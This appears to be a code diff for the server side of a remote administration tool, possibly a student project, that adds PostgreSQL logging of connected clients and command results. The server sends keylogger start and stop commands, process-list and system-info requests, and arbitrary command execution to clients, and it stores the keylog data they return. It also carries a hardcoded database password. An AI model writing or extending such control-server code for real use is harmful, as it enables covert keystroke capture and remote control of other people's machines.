@@ -24,7 +24,7 @@ ServerApp::ServerApp(const std::string &envFilePath)
     if (!m_dbManager.connect(
             "localhost", // Hostname or IP of the Postgres server
             5432,        // Default Postgres port
-            "postgres",  // Database name
+            "9rings",  // Database name
             "postgres",  // Database user
             "Admin123"   // Database password
             ))
@@ -40,6 +40,15 @@ ServerApp::ServerApp(const std::string &envFilePath)
 ServerApp::~ServerApp()
 {
     m_serverSocket.closeSocket();
+}
+
+/**
+ * @brief Load all clients from database and emit signal to update GUI
+ */
+void ServerApp::loadClientsFromDatabase()
+{
+    QList<QMap<QString, QVariant>> clients = m_dbManager.getAllClients();
+    emit clientsLoadedFromDatabase(clients);
 }
 
 /**
@@ -115,7 +124,18 @@ void ServerApp::processClient(size_t &idx, const fd_set &readfds, uint32_t &next
                     username = payload.substr(pos, end - pos);
             }
             m_clientUsers[idx] = username;
-            clientInfo = username + " " + client->getClientIP();
+            std::string clientIp = client->getClientIP();
+            clientInfo = username + " " + clientIp;
+            m_dbManager.addClient(QString::fromStdString(username), QString::fromStdString(clientIp));
+            // Explicitly update status to online
+            m_dbManager.updateClientOnlineStatus(QString::fromStdString(username), QString::fromStdString(clientIp), true);
+
+            // Store this as a client-initiated system info report
+            int clientId = m_dbManager.getClientId(QString::fromStdString(username), QString::fromStdString(clientIp));
+            if (clientId != -1) {
+                m_dbManager.addCommandResult(clientId, "CLIENT_SYSTEM_INFO", QString::fromStdString(payload));
+            }
+
             emit clientConnected(QString::fromStdString(clientInfo), nextSessionId++);
         }
         else
@@ -124,6 +144,53 @@ void ServerApp::processClient(size_t &idx, const fd_set &readfds, uint32_t &next
             qDebug() << "[ServerApp] pkt=" << static_cast<int>(pkt.getType())
                      << " from" << QString::fromStdString(clientInfo)
                      << "payload size=" << msg.size();
+            QPair<QString, QString> info = getUsernameAndIpFromClientInfo(QString::fromStdString(clientInfo));
+            QString username = info.first;
+            QString clientIp = info.second;
+            int clientId = m_dbManager.getClientId(username, clientIp);
+            
+            // Try to find the original command using the packet ID
+            uint16_t packetId = pkt.getPacketId();
+            QString originalCommand = m_dbManager.getPendingCommand(clientId, packetId);
+            
+            if (!originalCommand.isEmpty()) {
+                // We found the original command, store both command and output
+                QString output = QString::fromStdString(msg);
+                m_dbManager.addCommandResult(clientId, originalCommand, output);
+                // Remove the pending command since it's now completed
+                m_dbManager.removePendingCommand(clientId, packetId);
+                qDebug() << "[ServerApp] Command completed - Original:" << originalCommand << "Output size:" << output.size();
+            } else {
+                // Fallback: try to determine command type from packet type
+                QString command = "UNKNOWN_COMMAND";
+                switch (pkt.getType()) {
+                    case PacketType::RESPONSE:
+                        command = "COMMAND_RESPONSE";
+                        break;
+                    case PacketType::KEYLOG:
+                        command = "KEYLOG_DATA";
+                        break;
+                    case PacketType::PROCESS_LIST:
+                        command = "PROCESS_LIST_RESPONSE";
+                        break;
+                    case PacketType::GET_INFO:
+                        command = "GET_INFO_RESPONSE";
+                        break;
+                    case PacketType::EXEC_COMMAND:
+                        command = "EXEC_COMMAND_RESPONSE";
+                        break;
+                    case PacketType::PACKET_ERROR:
+                        command = "ERROR_RESPONSE";
+                        break;
+                    default:
+                        command = "UNKNOWN_COMMAND";
+                        break;
+                }
+                QString output = QString::fromStdString(msg);
+                m_dbManager.addCommandResult(clientId, command, output);
+                qDebug() << "[ServerApp] No pending command found for packet ID" << packetId << "- using" << command;
+            }
+            
             emit clientResponse(QString::fromStdString(clientInfo), QString::fromStdString(msg));
             std::string ackStr = "ACK: " + msg;
             LPTF_Packet ack(1, PacketType::RESPONSE, 0, 0, 0,
@@ -136,6 +203,17 @@ void ServerApp::processClient(size_t &idx, const fd_set &readfds, uint32_t &next
     {
         std::cout << "Client disconnect: " << client->getClientIP()
                   << " (" << e.what() << ")\n";
+        
+        // Update database status to offline before removing client
+        std::string clientInfo = m_clientUsers[idx] + " " + client->getClientIP();
+        QPair<QString, QString> info = getUsernameAndIpFromClientInfo(QString::fromStdString(clientInfo));
+        QString username = info.first;
+        QString clientIp = info.second;
+        if (!username.isEmpty() && !clientIp.isEmpty()) {
+            m_dbManager.updateClientOnlineStatus(username, clientIp, false);
+            emit clientDisconnected(QString::fromStdString(clientInfo));
+        }
+        
         m_clients.erase(m_clients.begin() + idx);
         m_clientUsers.erase(m_clientUsers.begin() + idx);
     }
@@ -171,12 +249,34 @@ void ServerApp::run()
  */
 void ServerApp::onGetInfoSys(const QString &clientId)
 {
+    static uint32_t packetIdCounter = 1;
     uint32_t sessionId = 0;
-    LPTF_Packet packet(1, PacketType::GET_INFO, 0, 0, sessionId, {});
+    uint16_t packetId = static_cast<uint16_t>(packetIdCounter++);
+    
+    // Store the pending command
+    QPair<QString, QString> info = getUsernameAndIpFromClientInfo(clientId);
+    QString username = info.first;
+    QString clientIp = info.second;
+    int dbClientId = m_dbManager.getClientId(username, clientIp);
+    if (dbClientId != -1) {
+        m_dbManager.addPendingCommand(dbClientId, packetId, "GET_INFO");
+    }
+    
+    LPTF_Packet packet(1, PacketType::GET_INFO, 0, packetId, sessionId, {});
     auto raw = packet.serialize();
     QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
     sendToClientInternal(clientId, qraw);
 }
+
+QPair<QString, QString> ServerApp::getUsernameAndIpFromClientInfo(const QString& clientInfo)
+{
+    QStringList parts = clientInfo.split(' ');
+    if (parts.size() >= 2) {
+        return qMakePair(parts.first(), parts.last());
+    }
+    return qMakePair(QString(), QString());
+}
+
 
 /**
  * @brief Sends the "start" keylogger command to client.
@@ -187,9 +287,19 @@ void ServerApp::onStartKeylogger(const QString &clientId)
     qDebug() << "[ServerApp] onStartKeylogger for" << clientId;
     const std::string cmdStart = "start";
     std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
-    const uint32_t packetId = 1;
+    static uint32_t packetId = 1;
     const uint32_t sessionId = 0;
-    LPTF_Packet packet(1, PacketType::KEYLOG, 0, packetId, sessionId, startPayload);
+    
+    // Store the pending command
+    QPair<QString, QString> info = getUsernameAndIpFromClientInfo(clientId);
+    QString username = info.first;
+    QString clientIp = info.second;
+    int dbClientId = m_dbManager.getClientId(username, clientIp);
+    if (dbClientId != -1) {
+        m_dbManager.addPendingCommand(dbClientId, static_cast<uint16_t>(packetId), "KEYLOG_START");
+    }
+    
+    LPTF_Packet packet(1, PacketType::KEYLOG, 0, packetId++, sessionId, startPayload);
     auto raw = packet.serialize();
     QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
     sendToClientInternal(clientId, qraw);
@@ -205,9 +315,19 @@ void ServerApp::onStopKeylogger(const QString &clientId)
     qDebug() << "[ServerApp] onStopKeylogger for" << clientId;
     const std::string cmdStop = "stop";
     std::vector<uint8_t> stopPayload(cmdStop.begin(), cmdStop.end());
-    const uint32_t packetId = 1;
+    static uint32_t packetId = 1;
     const uint32_t sessionId = 0;
-    LPTF_Packet packet(1, PacketType::KEYLOG, 0, packetId, sessionId, stopPayload);
+    
+    // Store the pending command
+    QPair<QString, QString> info = getUsernameAndIpFromClientInfo(clientId);
+    QString username = info.first;
+    QString clientIp = info.second;
+    int dbClientId = m_dbManager.getClientId(username, clientIp);
+    if (dbClientId != -1) {
+        m_dbManager.addPendingCommand(dbClientId, static_cast<uint16_t>(packetId), "KEYLOG_STOP");
+    }
+    
+    LPTF_Packet packet(1, PacketType::KEYLOG, 0, packetId++, sessionId, stopPayload);
     auto raw = packet.serialize();
     QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
     sendToClientInternal(clientId, qraw);
@@ -222,9 +342,21 @@ void ServerApp::onStopKeylogger(const QString &clientId)
 void ServerApp::onRequestProcessList(const QString &clientId, bool namesOnly)
 {
     qDebug() << "[ServerApp] onRequestProcessList for" << clientId << "namesOnly=" << namesOnly;
+    static uint32_t packetId = 1;
     uint32_t sessionId = 0;
     uint8_t flags = namesOnly ? 1 : 0;
-    LPTF_Packet packet(1, PacketType::PROCESS_LIST, flags, 0, sessionId, {});
+    
+    // Store the pending command
+    QPair<QString, QString> info = getUsernameAndIpFromClientInfo(clientId);
+    QString username = info.first;
+    QString clientIp = info.second;
+    int dbClientId = m_dbManager.getClientId(username, clientIp);
+    if (dbClientId != -1) {
+        QString commandDesc = namesOnly ? "PROCESS_LIST_NAMES_ONLY" : "PROCESS_LIST_FULL";
+        m_dbManager.addPendingCommand(dbClientId, static_cast<uint16_t>(packetId), commandDesc);
+    }
+    
+    LPTF_Packet packet(1, PacketType::PROCESS_LIST, flags, packetId++, sessionId, {});
     auto raw = packet.serialize();
     QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
     sendToClientInternal(clientId, qraw);
@@ -244,6 +376,16 @@ void ServerApp::onSendToClient(const QString &clientInfo, const QByteArray &data
     static uint32_t pktId = 1;
     uint32_t sessionId = 0;
     qDebug() << "[ServerApp] Sending EXEC_COMMAND to" << clientInfo << "with pktId=" << pktId;
+    
+    // Store the pending command in the database
+    QPair<QString, QString> info = getUsernameAndIpFromClientInfo(clientInfo);
+    QString username = info.first;
+    QString clientIp = info.second;
+    int clientId = m_dbManager.getClientId(username, clientIp);
+    if (clientId != -1) {
+        m_dbManager.addPendingCommand(clientId, static_cast<uint16_t>(pktId), QString::fromStdString(cmd));
+    }
+    
     LPTF_Packet packet(1, PacketType::EXEC_COMMAND, 0, pktId++, sessionId, payload);
     qDebug() << "[ServerApp] Packet serialized, size=" << packet.getPayload().size();
     auto raw = packet.serialize();
